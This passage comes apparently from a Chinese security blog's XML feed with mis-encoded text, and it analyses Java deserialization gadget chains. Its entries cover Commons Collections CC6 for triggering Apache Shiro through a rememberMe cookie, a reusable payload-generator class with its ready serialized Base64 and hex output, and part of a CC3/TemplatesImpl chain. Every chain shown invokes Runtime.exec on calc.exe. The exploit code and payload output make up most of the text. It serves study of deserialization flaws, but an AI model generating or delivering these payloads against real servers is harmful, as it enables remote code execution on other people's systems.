class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">    ),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// å¼¹å‡ºè®¡ç®—å™¨ï¼ˆWindowsï¼‰</span></span><br><span class="line">    )</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 2: åˆ›å»ºLazyMapå¹¶å…³è”Transformeré“¾</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 3: å°†LazyMapå°è£…åˆ°TiedMapEntryä¸­</span></span><br><span class="line"><span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 4: å°†TiedMapEntryæ”¾å…¥HashMapä»¥è§¦å‘ååºåˆ—åŒ–é“¾</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">hashMap.put(entry, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Step 5: ç§»é™¤LazyMapä¸­çš„ç¼“å­˜ï¼Œç¡®ä¿ååºåˆ—åŒ–æ—¶è§¦å‘é“¾</span></span><br><span class="line">lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="ä¸åŒç‚¹1ï¼šç¿»è¯‘é“¾å˜æˆç¿»è¯‘å™¨äº†"><a href="#ä¸åŒç‚¹1ï¼šç¿»è¯‘é“¾å˜æˆç¿»è¯‘å™¨äº†" class="headerlink" title="ä¸åŒç‚¹1ï¼šç¿»è¯‘é“¾å˜æˆç¿»è¯‘å™¨äº†"></a>ä¸åŒç‚¹1ï¼šç¿»è¯‘é“¾å˜æˆç¿»è¯‘å™¨äº†</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getClass&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰å¸¸é‡ç¿»è¯‘å™¨äº†æˆ‘ä»¬æ€ä¹ˆè¿”å›éœ€è¦çš„ç±»ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">    <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">        map.put(key, value);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åŸæ¥æ˜¯<code>Lazymap</code>çš„<code>get</code>æ–¹æ³•ä¼šè‡ªå·±è§¦å‘ç¿»è¯‘<br>ä¹Ÿå°±æ˜¯è¯´æ­¤æ—¶keyä½œä¸ºæ¶æ„ç±»è¿›å…¥ç¿»è¯‘å™¨å°±å¯ä»¥çœå»å¸¸é‡ç¿»è¯‘å™¨äº†</p><p>éœ€è¦è¿›è¡Œæ”¹åŠ¨çš„åŸå› ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è¿™é‡Œä»…ç»™å‡ºæœ€åçš„ç»“è®ºï¼šå¦‚æœååºåˆ—åŒ–æµä¸­åŒ…å«éJavaè‡ªèº«çš„æ•°ç»„ï¼Œåˆ™ä¼šå‡ºç°æ— æ³•åŠ è½½ç±»çš„é”™è¯¯ã€‚è¿™å°±</span><br><span class="line">è§£é‡Šäº†ä¸ºä»€ä¹ˆCommonsCollections6æ— æ³•åˆ©ç”¨äº†ï¼Œå› ä¸ºå…¶ä¸­ç”¨åˆ°äº†Transformeræ•°ç»„ã€‚</span><br></pre></td></tr></table></figure><h3 id="ä¸åŒç‚¹2ï¼šlazymapæ¸…é™¤ç¼“å­˜çš„å¦ä¸€ç§å†™æ³•"><a href="#ä¸åŒç‚¹2ï¼šlazymapæ¸…é™¤ç¼“å­˜çš„å¦ä¸€ç§å†™æ³•" class="headerlink" title="ä¸åŒç‚¹2ï¼šlazymapæ¸…é™¤ç¼“å­˜çš„å¦ä¸€ç§å†™æ³•"></a>ä¸åŒç‚¹2ï¼šlazymapæ¸…é™¤ç¼“å­˜çš„å¦ä¸€ç§å†™æ³•</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//CC6</span></span><br><span class="line">lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå†™ä½œï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">outerMap.clear();</span><br></pre></td></tr></table></figure><p>äº‹å®ä¸Šæ˜¯ä¸€æ ·çš„æ•ˆæœ<br>å¦‚æ­¤ä¸€æ¥å°±å¯ä»¥é€šè¿‡æ›´æ”¹cookieçš„æ–¹å¼è§¦å‘æ¶æ„çš„ååºåˆ—åŒ–æ“ä½œ<br>å¼¹å‡ºè®¡ç®—å™¨äº†</p><p><img src="/2025/04/18/java-shiro/shiro1.png" alt="alt text"><br>éœ€è¦æ³¨æ„æ¸…é™¤sessionå¦åˆ™ä¼šè¯è¿‡æœŸä¹‹å‰<br>remembermeçš„éƒ¨åˆ†ä¸ä¼šè¢«ååºåˆ—åŒ–</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaååºåˆ—åŒ–payloadç”Ÿæˆå™¨ï¼ˆæŒç»­æ›´æ–°ï¼‰</title>
      <link href="/2025/04/06/java-payload/"/>
      <url>/2025/04/06/java-payload/</url>
      
        <content type="html"><![CDATA[<p>åˆ©ç”¨<code>lazymap</code>å°†ç¿»è¯‘å™¨é“¾è½¬æ¢ä¸ºå¯ååºåˆ—åŒ–è§¦å‘çš„<code>payload</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TurnChainToPayload</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">TurnChainToPayload</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TurnChainToPayload</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">TurnChainToPayload</span><span class="params">()</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> TurnChainToPayload <span class="title function_">getInstance</span><span class="params">()</span> &#123; <span class="comment">// æä¾›å…¬å…±è®¿é—®æ–¹æ³•</span></span><br><span class="line">        <span class="keyword">return</span> INSTANCE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">getPayload</span><span class="params">(ChainedTransformer chain)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> turnChainToMap(chain);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> turnMapToSerialize(hashMap);</span><br><span class="line">        System.out.println(<span class="string">&quot;Base64ï¼š\n&quot;</span>+ Base64.getEncoder().encodeToString(bos.toByteArray()));</span><br><span class="line">        System.out.println(<span class="string">&quot;---------------------&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;Hexï¼š\n&quot;</span> + bytesToHex(bos.toByteArray()));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> HashMap <span class="title function_">turnChainToMap</span><span class="params">(ChainedTransformer chain)</span>&#123;</span><br><span class="line">        <span class="comment">// Step 2: åˆ›å»ºLazyMapå¹¶å…³è”Transformeré“¾</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), chain);</span><br><span class="line">        <span class="comment">//lazyMap.get(&quot;ciallo&quot;);</span></span><br><span class="line">        <span class="comment">// Step 3: å°†LazyMapå°è£…åˆ°TiedMapEntryä¸­</span></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="comment">//entry.hashCode();</span></span><br><span class="line">        <span class="comment">// Step 4: å°†TiedMapEntryæ”¾å…¥HashMapä»¥è§¦å‘ååºåˆ—åŒ–é“¾</span></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        hashMap.put(entry, <span class="string">&quot;bar&quot;</span>);</span><br><span class="line">        <span class="comment">// Step 5: ç§»é™¤LazyMapä¸­çš„ç¼“å­˜ï¼Œç¡®ä¿ååºåˆ—åŒ–æ—¶è§¦å‘é“¾</span></span><br><span class="line">        lazyMap.remove(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> hashMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ByteArrayOutputStream <span class="title function_">turnMapToSerialize</span><span class="params">(HashMap hashMap)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.close();</span><br><span class="line">        <span class="comment">//System.out.println(Base64.getEncoder().encodeToString(bos.toByteArray()));</span></span><br><span class="line">        <span class="keyword">return</span> bos;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">bytesToHex</span><span class="params">(<span class="type">byte</span>[] bytes)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">hexString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">byte</span> b : bytes) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> Integer.toHexString(<span class="number">0xff</span> &amp; b);</span><br><span class="line">            <span class="keyword">if</span> (hex.length() == <span class="number">1</span>) &#123;</span><br><span class="line">                hexString.append(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            hexString.append(hex);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> hexString.toString().toUpperCase();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”¨ä¾‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;  <span class="comment">// å¼¹å‡ºè®¡ç®—å™¨ï¼ˆWindowsï¼‰</span></span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">TurnChainToPayload</span> <span class="variable">turner</span> <span class="operator">=</span> TurnChainToPayload.getInstance();</span><br><span class="line">        turner.getPayload(chain);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Base64ï¼š</span><br><span class="line">rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IANG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5rZXl2YWx1ZS5UaWVkTWFwRW50cnmKrdKbOcEf2wIAAkwAA2tleXQAEkxqYXZhL2xhbmcvT2JqZWN0O0wAA21hcHQAD0xqYXZhL3V0aWwvTWFwO3hwdAADZm9vc3IAKm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5tYXAuTGF6eU1hcG7llIKeeRCUAwABTAAHZmFjdG9yeXQALExvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNoYWluZWRUcmFuc2Zvcm1lcjDHl+woepcEAgABWwANaVRyYW5zZm9ybWVyc3QALVtMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwdXIALVtMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLlRyYW5zZm9ybWVyO71WKvHYNBiZAgAAeHAAAAAEc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5Db25zdGFudFRyYW5zZm9ybWVyWHaQEUECsZQCAAFMAAlpQ29uc3RhbnRxAH4AA3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXVyABJbTGphdmEubGFuZy5DbGFzczurFteuy81amQIAAHhwAAAAAHQACWdldE1ldGhvZHVxAH4AGwAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABtzcQB+ABN1cQB+ABgAAAACcHVxAH4AGAAAAAB0AAZpbnZva2V1cQB+ABsAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAYc3EAfgATdXEAfgAYAAAAAXQACGNhbGMuZXhldAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AAD9AAAAAAAAMdwgAAAAQAAAAAHh4dAADYmFyeA==</span><br><span class="line">---------------------</span><br><span class="line">Hexï¼š</span><br><span class="line">ACED0005737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F4000000000000C77080000001000000001737200346F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6B657976616C75652E546965644D6170456E7472798AADD29B39C11FDB0200024C00036B65797400124C6A6176612F6C616E672F4F626A6563743B4C00036D617074000F4C6A6176612F7574696C2F4D61703B7870740003666F6F7372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000047372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E7471007E00037870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001B00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001B7371007E00137571007E001800000002707571007E001800000000740006696E766F6B657571007E001B00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E00187371007E00137571007E00180000000174000863616C632E657865740004657865637571007E001B0000000171007E00207371007E00003F4000000000000C77080000001000000000787874000362617278</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaé“¾å­åˆ†æâ€”CommonsCollections3</title>
      <link href="/2025/04/06/java-cc3/"/>
      <url>/2025/04/06/java-cc3/</url>
      
        <content type="html"><![CDATA[<h3 id="åˆ©ç”¨TemplatesImplçš„ä»»æ„æ¶æ„ç±»åŠ è½½demo"><a href="#åˆ©ç”¨TemplatesImplçš„ä»»æ„æ¶æ„ç±»åŠ è½½demo" class="headerlink" title="åˆ©ç”¨TemplatesImplçš„ä»»æ„æ¶æ„ç±»åŠ è½½demo"></a>åˆ©ç”¨TemplatesImplçš„ä»»æ„æ¶æ„ç±»åŠ è½½demo</h3><p>ä¸Šä¸€ç¯‡ä¸­å­¦ä¹ äº†åˆ©ç”¨<code>TemplatesImpl</code>åŠ è½½ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesImplExample</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;base64å­—èŠ‚ç &quot;</span>);</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123; code &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;NOT NULL&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        obj.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span></span><br><span class="line">            <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>); <span class="comment">// å…è®¸è®¿é—®ç§æœ‰å­—æ®µ</span></span><br><span class="line">        field.set(obj, value);    <span class="comment">// è®¾ç½®å­—æ®µå€¼</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»“åˆä¹‹å‰ç”Ÿæˆæ¶æ„åºåˆ—åŒ–æ•°æ®çš„demoï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="string">&quot;getRuntime&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; <span class="literal">null</span>, <span class="keyword">new</span></span><br><span class="line">                        <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class</span><br><span class="line">                &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">String</span>[] &#123;</span><br><span class="line">                                <span class="string">&quot;calc&quot;</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="comment">//innerMap.put(&quot;value&quot;, &quot;xxxx&quot;);</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br></pre></td></tr></table></figure><p>å¯ä»¥æŠŠå®ƒä»¬ç»“åˆä¸€ä¸‹<br>è¿™æ ·å°±å¯ä»¥å®ç°åŠ è½½ä¸€ä¸ªè‡ªå®šä¹‰çš„æ¶æ„ç±»<br>æ‰§è¡Œä»»ä½•ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span></span><br><span class="line">        com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> 